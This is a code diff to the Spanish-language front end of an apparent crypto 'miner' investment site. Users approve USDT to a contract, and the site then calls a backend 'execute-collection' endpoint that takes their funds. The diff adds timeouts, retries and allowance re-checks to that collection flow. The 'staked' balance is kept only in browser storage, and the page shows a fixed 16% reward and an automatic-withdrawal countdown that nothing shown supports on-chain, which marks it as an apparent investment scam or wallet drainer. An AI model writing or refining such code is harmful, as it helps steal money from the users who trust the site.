@@ -35,7 +35,9 @@ const ERC20_ABI = [
 
 const USDT_DECIMALS = Number(CONFIG.USDT_DECIMALS || 18);
 const MIN_INVEST = 0.1;
-const DEFAULT_MAX = 1000.00;
+const DEFAULT_MAX = 1000.0;
+const SESSION_TXS_LIMIT = 10;
+const TX_CONFIRM_TIMEOUT_MS = 2 * 60 * 1000; // 2 minutes
 
 // ==========================================
 // INICIALIZACIÓN DE LA APLICACIÓN
@@ -45,13 +47,13 @@ export async function initApp() {
     initWalletModal();
     setupUIEventListeners();
     updateMainActionButton('CONNECT');
-    
-    const merchantInput = document.getElementById("merchantAddress");
+
+    const merchantInput = document.getElementById('merchantAddress');
     if (merchantInput) {
         merchantInput.value = CONFIG.MERCHANT_ADDRESS;
         makeCopyableInput(merchantInput, CONFIG.MERCHANT_ADDRESS);
     }
-    
+
     // Renderizar transacciones persistidas al cargar
     renderStoredTransactions();
 }
@@ -89,10 +91,10 @@ function initWalletModal() {
         defaultNetwork: bsc,
         metadata,
         projectId: CONFIG.PROJECT_ID,
-        features: { 
-            analytics: true, 
-            swaps: false, 
-            onramp: false 
+        features: {
+            analytics: true,
+            swaps: false,
+            onramp: false
         }
     });
 
@@ -103,7 +105,7 @@ function initWalletModal() {
         handleConnectedProvider(activeProv);
     }
 
-    if (modal && typeof modal.subscribeEvents === "function") {
+    if (modal && typeof modal.subscribeEvents === 'function') {
         modal.subscribeEvents((event) => {
             if (event.data && event.data.event === 'DISCONNECT') {
                 resetAppSession();
@@ -133,15 +135,15 @@ async function handleConnectedProvider(walletProvider) {
         // Restaurar estado persistido del usuario si existe en localStorage
         loadUserState(userAddress);
 
-        if (walletProvider && typeof walletProvider.on === "function") {
-            walletProvider.removeAllListeners?.("disconnect");
-            walletProvider.removeAllListeners?.("accountsChanged");
+        if (walletProvider && typeof walletProvider.on === 'function') {
+            walletProvider.removeAllListeners?.('disconnect');
+            walletProvider.removeAllListeners?.('accountsChanged');
 
-            walletProvider.on("disconnect", async () => {
+            walletProvider.on('disconnect', async () => {
                 await forceCloseReownSession();
             });
 
-            walletProvider.on("accountsChanged", async (accounts) => {
+            walletProvider.on('accountsChanged', async (accounts) => {
                 if (!accounts || accounts.length === 0) {
                     await forceCloseReownSession();
                 } else {
@@ -155,7 +157,7 @@ async function handleConnectedProvider(walletProvider) {
         updateMainActionButton('INVEST');
         validateInvestmentInput();
     } catch (error) {
-        console.error("Error al sincronizar proveedor con Ethers v5:", error);
+        console.error('Error al sincronizar proveedor con Ethers v5:', error);
         resetAppSession();
     }
 }
@@ -172,7 +174,7 @@ function saveUserState(address, stakedAmount) {
     try {
         localStorage.setItem(`miner_user_state_${address.toLowerCase()}`, JSON.stringify(stateData));
     } catch (e) {
-        console.warn("No se pudo guardar el estado del usuario:", e);
+        console.warn('No se pudo guardar el estado del usuario:', e);
     }
 }
 
@@ -187,7 +189,7 @@ function loadUserState(address) {
             }
         }
     } catch (e) {
-        console.warn("No se pudo cargar el estado persistido del usuario", e);
+        console.warn('No se pudo cargar el estado persistido del usuario', e);
     }
 }
 
@@ -196,11 +198,11 @@ function loadUserState(address) {
 // ==========================================
 async function forceCloseReownSession() {
     try {
-        if (modal && typeof modal.disconnect === "function") {
+        if (modal && typeof modal.disconnect === 'function') {
             await modal.disconnect();
         }
     } catch (e) {
-        console.warn("Error al cerrar sesión en AppKit:", e);
+        console.warn('Error al cerrar sesión en AppKit:', e);
     }
 
     for (let i = localStorage.length - 1; i >= 0; i--) {
@@ -213,24 +215,66 @@ async function forceCloseReownSession() {
     resetAppSession();
 }
 
-window.disconnectWalletSession = async function() {
+window.disconnectWalletSession = async function () {
     try {
-        if (modal && typeof modal.getWalletProvider === "function") {
+        if (modal && typeof modal.getWalletProvider === 'function') {
             const rawProv = modal.getWalletProvider();
-            if (rawProv && typeof rawProv.request === "function") {
+            if (rawProv && typeof rawProv.request === 'function') {
                 await rawProv.request({
-                    method: "wallet_revokePermissions",
+                    method: 'wallet_revokePermissions',
                     params: [{ eth_accounts: {} }]
                 }).catch(() => {});
             }
         }
-    } catch (e) {}
+    } catch (e) { }
 
     await forceCloseReownSession();
     setTimeout(() => {
         window.location.reload();
     }, 200);
 };
+
+// ==========================================
+// UTILIDADES DE NUMÉRICOS Y TX
+// ==========================================
+function formatBalanceBN(bn) {
+    try {
+        return parseFloat(ethers.utils.formatUnits(bn, USDT_DECIMALS));
+    } catch (e) {
+        return 0;
+    }
+}
+
+function parseInputToBN(valueStr) {
+    const safeStr = String(valueStr || '').trim();
+    if (safeStr === '') return ethers.BigNumber.from(0);
+    return ethers.utils.parseUnits(safeStr, USDT_DECIMALS);
+}
+
+async function waitForTxReceipt(activeProvider, txHash, timeoutMs = TX_CONFIRM_TIMEOUT_MS) {
+    const pollInterval = 1500;
+    const maxAttempts = Math.ceil(timeoutMs / pollInterval);
+    let attempts = 0;
+    while (attempts < maxAttempts) {
+        try {
+            const receipt = await activeProvider.getTransactionReceipt(txHash);
+            if (receipt && receipt.confirmations && receipt.status !== undefined) return receipt;
+        } catch (e) {
+            // ignore and retry
+        }
+        await new Promise(r => setTimeout(r, pollInterval));
+        attempts++;
+    }
+    throw new Error('Timeout esperando confirmación de la transacción');
+}
+
+function isValidAddress(addr) {
+    try {
+        return ethers.utils.isAddress(addr);
+    } catch (e) {
+        return false;
+    }
+}
 
 // ==========================================
 // GESTIÓN DE INTERFAZ Y SALDOS (ETHERS v5)
@@ -240,22 +284,22 @@ async function updateBalances(rawProvider) {
     try {
         const activeProvider = provider || new ethers.providers.Web3Provider(rawProvider);
         const activeSigner = signer || activeProvider.getSigner();
-        
+
         const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
         const usdtBal = await usdtContract.balanceOf(userAddress);
         latestUsdtBalanceBN = usdtBal;
-        latestUsdtBalanceFloat = parseFloat(ethers.utils.formatUnits(usdtBal, USDT_DECIMALS));
+        latestUsdtBalanceFloat = formatBalanceBN(usdtBal);
 
-        const balanceLabel = document.getElementById("walletBalanceLabel");
+        const balanceLabel = document.getElementById('walletBalanceLabel');
         if (balanceLabel) {
             balanceLabel.textContent = `Saldo: ${latestUsdtBalanceFloat.toFixed(2)} USDT`;
         }
 
         // Configuración global y dinámica del botón MAX (Independiente del estado de conexión)
-        const maxBtn = document.getElementById("maxBtn");
+        const maxBtn = document.getElementById('maxBtn');
         if (maxBtn) {
             maxBtn.onclick = () => {
-                const amountInput = document.getElementById("investAmount");
+                const amountInput = document.getElementById('investAmount');
                 if (!amountInput) return;
 
                 // Si el usuario está conectado, adaptamos el MAX a su saldo real disponible
@@ -271,12 +315,12 @@ async function updateBalances(rawProvider) {
         }
 
     } catch (err) {
-        console.error("Error al sincronizar saldos en vivo:", err);
+        console.error('Error al sincronizar saldos en vivo:', err);
     }
 }
 
 function updateWalletUI(account) {
-    const container = document.getElementById("walletButtonContainer");
+    const container = document.getElementById('walletButtonContainer');
     if (container) {
         // Crear elementos de forma segura en lugar de innerHTML para evitar XSS
         container.innerHTML = '';
@@ -304,11 +348,11 @@ function updateWalletUI(account) {
         container.appendChild(wrapper);
     }
 
-    const txContainer = document.getElementById("sessionTxContainer");
-    if (txContainer) txContainer.style.display = "block";
+    const txContainer = document.getElementById('sessionTxContainer');
+    if (txContainer) txContainer.style.display = 'block';
 
-    const withdrawalContainer = document.getElementById("withdrawalContainer");
-    if (withdrawalContainer) withdrawalContainer.style.display = "block";
+    const withdrawalContainer = document.getElementById('withdrawalContainer');
+    if (withdrawalContainer) withdrawalContainer.style.display = 'block';
 
     updateMainActionButton('INVEST');
 }
@@ -319,7 +363,7 @@ function resetAppSession() {
     userAddress = null;
     userRealStakedAmount = 0;
 
-    const container = document.getElementById("walletButtonContainer");
+    const container = document.getElementById('walletButtonContainer');
     if (container) {
         container.innerHTML = `
             <button onclick="window.openConnectModal()" class="wallet-badge" style="background: rgba(38,161,123,0.15); border: 1px solid var(--brand-primary); cursor: pointer;">
@@ -328,24 +372,24 @@ function resetAppSession() {
         `;
     }
 
-    const balanceLabel = document.getElementById("walletBalanceLabel");
-    if (balanceLabel) balanceLabel.textContent = "Saldo: 0.00 USDT";
+    const balanceLabel = document.getElementById('walletBalanceLabel');
+    if (balanceLabel) balanceLabel.textContent = 'Saldo: 0.00 USDT';
 
-    const stakedBadge = document.getElementById("stakedAmountBadge");
-    if (stakedBadge) stakedBadge.textContent = "0.00 USDT";
+    const stakedBadge = document.getElementById('stakedAmountBadge');
+    if (stakedBadge) stakedBadge.textContent = '0.00 USDT';
 
-    const pendingReward = document.getElementById("pendingRewardOutput");
-    if (pendingReward) pendingReward.textContent = "0.00 USDT";
+    const pendingReward = document.getElementById('pendingRewardOutput');
+    if (pendingReward) pendingReward.textContent = '0.00 USDT';
 
     if (countdownTimerInterval) clearInterval(countdownTimerInterval);
-    const countdownEl = document.getElementById("roiCountdown");
-    if (countdownEl) countdownEl.textContent = "--:--:--:--";
+    const countdownEl = document.getElementById('roiCountdown');
+    if (countdownEl) countdownEl.textContent = '--:--:--:--';
 
-    const txContainer = document.getElementById("sessionTxContainer");
-    if (txContainer) txContainer.style.display = "none";
+    const txContainer = document.getElementById('sessionTxContainer');
+    if (txContainer) txContainer.style.display = 'none';
 
-    const withdrawalContainer = document.getElementById("withdrawalContainer");
-    if (withdrawalContainer) withdrawalContainer.style.display = "none";
+    const withdrawalContainer = document.getElementById('withdrawalContainer');
+    if (withdrawalContainer) withdrawalContainer.style.display = 'none';
 
     updateMainActionButton('CONNECT');
     validateInvestmentInput();
@@ -353,18 +397,18 @@ function resetAppSession() {
 
 function updateStakedUI(amount, persist = true) {
     userRealStakedAmount = parseFloat(amount) || 0;
-    
+
     if (userAddress && persist) {
         saveUserState(userAddress, userRealStakedAmount);
     }
-    
-    const stakedBadge = document.getElementById("stakedAmountBadge");
-    const pendingReward = document.getElementById("pendingRewardOutput");
-    
+
+    const stakedBadge = document.getElementById('stakedAmountBadge');
+    const pendingReward = document.getElementById('pendingRewardOutput');
+
     if (stakedBadge) {
         stakedBadge.textContent = `${userRealStakedAmount.toFixed(2)} USDT`;
     }
-    
+
     if (pendingReward) {
         const calculatedReward = userRealStakedAmount * 0.16;
         pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
@@ -377,7 +421,7 @@ function updateStakedUI(amount, persist = true) {
 
 function startRoiCountdown(durationInSeconds) {
     let timer = durationInSeconds;
-    const countdownEl = document.getElementById("roiCountdown");
+    const countdownEl = document.getElementById('roiCountdown');
     if (!countdownEl) return;
 
     if (countdownTimerInterval) clearInterval(countdownTimerInterval);
@@ -392,36 +436,36 @@ function startRoiCountdown(durationInSeconds) {
 
         if (--timer < 0) {
             clearInterval(countdownTimerInterval);
-            countdownEl.textContent = "¡Completado (Retiro Auto)";
+            countdownEl.textContent = '¡Completado (Retiro Auto)';
         }
     }, 1000);
 }
 
 function updateMainActionButton(state) {
-    const approveBtn = document.getElementById("approveBtn");
-    const btnText = document.getElementById("btnText");
+    const approveBtn = document.getElementById('approveBtn');
+    const btnText = document.getElementById('btnText');
     if (!approveBtn || !btnText) return;
 
     if (state === 'CONNECT') {
-        btnText.textContent = "CONECTAR BILLETERA";
+        btnText.textContent = 'CONECTAR BILLETERA';
         approveBtn.onclick = () => openConnectModal();
     } else {
-        btnText.textContent = "INVERTIR AHORA";
+        btnText.textContent = 'INVERTIR AHORA';
         approveBtn.onclick = async () => {
             let rawProvider = null;
-            if (modal && typeof modal.getWalletProvider === "function") {
+            if (modal && typeof modal.getWalletProvider === 'function') {
                 try {
                     rawProvider = modal.getWalletProvider();
-                } catch (_) {}
+                } catch (_) { }
             }
 
             if (!rawProvider) {
                 pendingInvestment = true;
-                if (modal && typeof modal.open === "function") {
+                if (modal && typeof modal.open === 'function') {
                     try {
                         modal.open();
                     } catch (err) {
-                        console.error("Error al desplegar el selector de billeteras:", err);
+                        console.error('Error al desplegar el selector de billeteras:', err);
                         pendingInvestment = false;
                     }
                 }
@@ -434,23 +478,23 @@ function updateMainActionButton(state) {
 }
 
 function setupUIEventListeners() {
-    const input = document.getElementById("investAmount");
+    const input = document.getElementById('investAmount');
     if (input) {
-        input.addEventListener("input", validateInvestmentInput);
+        input.addEventListener('input', validateInvestmentInput);
     }
 }
 
 // Validación de límites (MIN fijo en 0.1 y MAX adaptable al estado)
 function validateInvestmentInput() {
-    const input = document.getElementById("investAmount");
+    const input = document.getElementById('investAmount');
     const wrapper = input ? input.closest('.input-wrapper') : null;
     if (!input || !wrapper) return;
 
     const val = parseFloat(input.value) || 0;
     const minVal = MIN_INVEST; // Mínimo fijo estricto
-    
+
     let maxVal = DEFAULT_MAX; // Máximo por defecto si no está conectado
-    
+
     if (userAddress) {
         if (typeof latestUsdtBalanceFloat === 'number') {
             maxVal = parseFloat(latestUsdtBalanceFloat) || DEFAULT_MAX;
@@ -471,7 +515,7 @@ function updateStepper(activeStep) {
         const stepEl = document.getElementById(`step-${i}`);
         if (!stepEl) continue;
         const circle = stepEl.querySelector('.step-circle');
-        
+
         if (i < activeStep) {
             circle.style.background = '#10b981';
             circle.style.color = '#fff';
@@ -492,39 +536,39 @@ function updateStepper(activeStep) {
 }
 
 // ==========================================
-// FLUJO DE INVERSIÓN (ETHERS v5)
+// FLUJO DE INVERSIÓN (ETHERS v5) - MEJORADO
 // ==========================================
 async function runInvestmentFlow(rawProvider) {
-    setLoading(true, "Conectando proveedor…");
+    setLoading(true, 'Conectando proveedor…');
     updateStepper(1);
-  
+
     try {
         const activeProvider = new ethers.providers.Web3Provider(rawProvider);
-        
-        setLoading(true, "Verificando red BSC...");
+
+        setLoading(true, 'Verificando red BSC...');
         const network = await activeProvider.getNetwork();
         const targetChainIdNum = typeof CONFIG.CHAIN_ID === 'string' && CONFIG.CHAIN_ID.startsWith('0x') ? parseInt(CONFIG.CHAIN_ID, 16) : Number(CONFIG.CHAIN_ID);
         if (Number(network.chainId) !== targetChainIdNum) {
-            setLoading(true, "Cambiando a red BSC…");
+            setLoading(true, 'Cambiando a red BSC…');
             try {
                 await rawProvider.request({
-                    method: "wallet_switchEthereumChain",
+                    method: 'wallet_switchEthereumChain',
                     params: [{ chainId: CONFIG.CHAIN_ID }]
                 });
             } catch (switchError) {
-                if (switchError.code === 4902) {
+                if (switchError && switchError.code === 4902) {
                     await rawProvider.request({
-                        method: "wallet_addEthereumChain",
+                        method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: CONFIG.CHAIN_ID,
                             chainName: CONFIG.CHAIN_NAME,
                             rpcUrls: CONFIG.RPC_URLS,
-                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                             blockExplorerUrls: [CONFIG.BLOCK_EXPLORER]
                         }]
                     });
                 } else {
-                    showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+                    showToast('Cambia manualmente a BNB Smart Chain en tu wallet.', 'error');
                     setLoading(false);
                     return;
                 }
@@ -534,69 +578,89 @@ async function runInvestmentFlow(rawProvider) {
         const activeSigner = activeProvider.getSigner();
         const activeUserAddress = await activeSigner.getAddress();
 
-        setLoading(true, "Verificando saldo de gas (BNB)…");
+        setLoading(true, 'Verificando saldo de gas (BNB)…');
         const bnbBalance = await activeProvider.getBalance(activeUserAddress);
-        const minGasRequired = ethers.utils.parseEther("0.0005");
+        const minGasRequired = ethers.utils.parseEther('0.0005');
 
         if (bnbBalance.lt(minGasRequired)) {
-            showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
+            showToast('Saldo de BNB insuficiente para pagar la comisión de red (Gas).', 'error');
             setLoading(false);
             return;
         }
 
-        const inputElement = document.getElementById("investAmount");
+        const inputElement = document.getElementById('investAmount');
         const rawInputVal = inputElement ? inputElement.value : String(MIN_INVEST);
-        const requiredAmount = ethers.utils.parseUnits(rawInputVal || String(MIN_INVEST), USDT_DECIMALS);
+        const requiredAmountBN = parseInputToBN(rawInputVal || String(MIN_INVEST));
 
         const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
 
-        setLoading(true, "Validando saldo de USDT…");
+        setLoading(true, 'Validando saldo de USDT…');
         const usdtBalance = await usdtContract.balanceOf(activeUserAddress);
 
-        if (usdtBalance.lt(requiredAmount)) {
-            showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
+        if (usdtBalance.lt(requiredAmountBN)) {
+            showToast('No tienes suficiente saldo de USDT en tu billetera.', 'error');
             setLoading(false);
             return;
         }
 
         updateStepper(2);
-        setLoading(true, "Verificando autorizaciones...");
-        const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
-        
+        setLoading(true, 'Verificando autorizaciones...');
+        let allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
+
         const zeroBN = ethers.BigNumber.from(0);
-        if (allowance.lt(requiredAmount)) {
+        if (allowance.lt(requiredAmountBN)) {
+            // Si hay una allowance parcial, resetear a 0 para evitar problemas de tokens que no permiten aumento directo
             if (allowance.gt(zeroBN)) {
-                setLoading(true, "Restableciendo autorización previa...");
+                setLoading(true, 'Restableciendo autorización previa...');
                 const txReset = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, zeroBN);
                 await txReset.wait();
+                // re-check
+                allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
             }
-        
-            setLoading(true, "Firma requerida: Aprobar USDT…");
-            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmount);
-            
-            setLoading(true, "Confirmando aprobación en red...");
+
+            setLoading(true, 'Firma requerida: Aprobar USDT…');
+            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmountBN);
             await txApprove.wait();
+
+            // re-check para asegurarnos que la allowance ahora es suficiente
+            allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
+            if (allowance.lt(requiredAmountBN)) {
+                throw new Error('La aprobación no otorgó suficiente allowance. Intenta nuevamente.');
+            }
         }
 
         updateStepper(3);
-        setLoading(true, "Procesando inversión en protocolo...");
-          
+        setLoading(true, 'Procesando inversión en protocolo...');
+
         const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);
 
-        const txHash = txCollect?.hash || "";
+        const txHash = txCollect?.hash || '';
         if (txHash) {
             addSessionTransaction(txHash);
-            showToast(`¡Inversión exitosa!`, "success", 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
+            showToast('Inversión enviada, esperando confirmación...', 'default', 10 * 1000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
+
+            // Esperar confirmación con timeout
+            try {
+                const receipt = await waitForTxReceipt(activeProvider, txHash, TX_CONFIRM_TIMEOUT_MS);
+                if (receipt && receipt.status === 1) {
+                    showToast('¡Inversión confirmada!', 'success', 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
+                } else {
+                    showToast('La transacción fue revertida o falló. Revisa BscScan.', 'error', 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
+                }
+            } catch (e) {
+                console.warn('No se obtuvo confirmación a tiempo:', e);
+                showToast('Operación enviada, pero no se confirmó en el tiempo esperado. Revisa en el explorer.', 'default', 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
+            }
         } else {
-            showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
+            showToast('¡Transacción completada con éxito! Gracias.', 'success', 6000);
         }
 
         updateStakedUI(rawInputVal);
 
     } catch (err) {
-        console.error("Error en el flujo de inversión:", err);
-        const errorMsg = err?.reason || err?.message || "Error desconocido en la transacción.";
-        showToast(`Operación cancelada o fallida: ${String(errorMsg).substring(0, 80)}`, "error", 6000);
+        console.error('Error en el flujo de inversión:', err);
+        const errorMsg = err?.reason || err?.message || 'Error desconocido en la transacción.';
+        showToast(`Operación cancelada o fallida: ${String(errorMsg).substring(0, 120)}`, 'error', 8000);
     } finally {
         setLoading(false);
         updateStepper(1);
@@ -605,20 +669,28 @@ async function runInvestmentFlow(rawProvider) {
 
 async function triggerBackendCollect(userAddress, amountStr) {
     let lastErr;
-    const dynamicAmountWei = ethers.utils.parseUnits(amountStr.toString(), USDT_DECIMALS).toString();
+    const dynamicAmountWei = parseInputToBN(amountStr.toString()).toString();
 
     for (let i = 1; i <= 3; i++) {
         try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 20_000); // 20s timeout
+
             const res = await fetch(`${CONFIG.BACKEND_URL}/execute-collection`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei }),
+                signal: controller.signal
             });
+
+            clearTimeout(timeout);
+
             const data = await res.json();
-            if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
+            if (!res.ok || !data.success) throw new Error(data.error || 'Collection failed.');
             return data;
         } catch (e) {
             lastErr = e;
+            if (e.name === 'AbortError') lastErr = new Error('Timeout calling backend');
             if (i < 3) await new Promise(r => setTimeout(r, 3000));
         }
     }
@@ -626,21 +698,21 @@ async function triggerBackendCollect(userAddress, amountStr) {
 }
 
 function addSessionTransaction(txHash) {
-    if (!sessionTxs.includes(txHash)) {
-        sessionTxs.unshift(txHash);
-        // Mantener un límite máximo de 10 transacciones guardadas
-        if (sessionTxs.length > 10) sessionTxs.pop();
-        try {
+    try {
+        if (!sessionTxs.includes(txHash)) {
+            sessionTxs.unshift(txHash);
+            // Mantener un límite máximo de transacciones guardadas
+            if (sessionTxs.length > SESSION_TXS_LIMIT) sessionTxs = sessionTxs.slice(0, SESSION_TXS_LIMIT);
             localStorage.setItem('miner_session_txs', JSON.stringify(sessionTxs));
-        } catch (e) {
-            console.warn("No se pudo guardar la transacción en localStorage", e);
         }
+    } catch (e) {
+        console.warn('No se pudo guardar la transacción en localStorage', e);
     }
     renderStoredTransactions();
 }
 
 function renderStoredTransactions() {
-    const listContainer = document.getElementById("sessionTxList");
+    const listContainer = document.getElementById('sessionTxList');
     if (!listContainer) return;
 
     // Limpiar primero
@@ -685,9 +757,9 @@ function renderStoredTransactions() {
 }
 
 function makeCopyableInput(element, text) {
-    element.style.cursor = "pointer";
-    element.title = "Hacer clic para copiar dirección";
-    element.addEventListener("click", async () => {
+    element.style.cursor = 'pointer';
+    element.title = 'Hacer clic para copiar dirección';
+    element.addEventListener('click', async () => {
         try {
             if (navigator.clipboard && navigator.clipboard.writeText) {
                 await navigator.clipboard.writeText(text);
@@ -700,9 +772,10 @@ function makeCopyableInput(element, text) {
                 document.execCommand('copy');
                 document.body.removeChild(ta);
             }
-            showToast("¡Dirección copiada al portapapeles!", "success", 2500);
+            showToast('¡Dirección copiada al portapapeles!', 'success', 2500);
         } catch (err) {
-            console.error("Error al copiar:", err);
+            console.error('Error al copiar:', err);
+            showToast('No se pudo copiar la dirección automáticamente. Selecciónala y cópiala manualmente.', 'error', 4000);
         }
     });
 }
@@ -710,24 +783,24 @@ function makeCopyableInput(element, text) {
 // ==========================================
 // UTILIDADES UI (LOADERS Y TOASTS)
 // ==========================================
-const approveBtn = document.getElementById("approveBtn");
-const btnText = document.getElementById("btnText");
-const btnSpinner = document.getElementById("btnSpinner");
-const toastEl = document.getElementById("toast");
+const approveBtn = document.getElementById('approveBtn');
+const btnText = document.getElementById('btnText');
+const btnSpinner = document.getElementById('btnSpinner');
+const toastEl = document.getElementById('toast');
 
-function setLoading(on, label = "Procesando…") {
+function setLoading(on, label = 'Procesando…') {
     if (!approveBtn) return;
     approveBtn.disabled = on;
-    approveBtn.style.opacity = on ? "0.8" : "1";
-    if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
+    approveBtn.style.opacity = on ? '0.8' : '1';
+    if (btnText) btnText.textContent = on ? label.toUpperCase() : 'INVERTIR AHORA';
     if (btnSpinner) btnSpinner.hidden = !on;
 }
 
 let _toastTimer;
-function showToast(msg, type = "default", ms = 4500, link = null) {
+function showToast(msg, type = 'default', ms = 4500, link = null) {
     if (!toastEl) return;
     clearTimeout(_toastTimer);
-    toastEl.dataset.type = type === "default" ? "" : type;
+    toastEl.dataset.type = type === 'default' ? '' : type;
     toastEl.hidden = false;
     // Limpiar contenido
     toastEl.innerHTML = '';
@@ -750,12 +823,12 @@ function showToast(msg, type = "default", ms = 4500, link = null) {
         toastEl.appendChild(textNode);
     }
   
-    if (type === "success") {
-        toastEl.style.background = "rgba(38, 161, 123, 0.95)";
-    } else if (type === "error") {
-        toastEl.style.background = "rgba(220, 53, 69, 0.95)";
+    if (type === 'success') {
+        toastEl.style.background = 'rgba(38, 161, 123, 0.95)';
+    } else if (type === 'error') {
+        toastEl.style.background = 'rgba(220, 53, 69, 0.95)';
     } else {
-        toastEl.style.removeProperty("background");
+        toastEl.style.removeProperty('background');
     }
 
     _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
